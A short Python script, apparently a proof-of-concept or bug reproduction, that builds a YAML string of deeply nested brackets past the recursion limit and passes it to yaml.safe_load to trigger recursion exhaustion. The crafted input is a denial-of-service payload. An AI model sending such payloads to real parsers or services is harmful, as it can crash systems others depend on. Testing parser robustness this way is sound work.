import sys
import yaml

# Demonstrates deep nesting causing recursion exhaustion.
# Adjust depth if needed for your environment.
depth = sys.getrecursionlimit() + 50
payload = "[" * depth + "]" * depth

try:
    yaml.safe_load(payload)
    print("parsed successfully at depth", depth)
except RecursionError as exc:
    print("RecursionError at depth", depth, "-", exc)
except Exception as exc:
    print("error at depth", depth, "-", type(exc).__name__, exc)
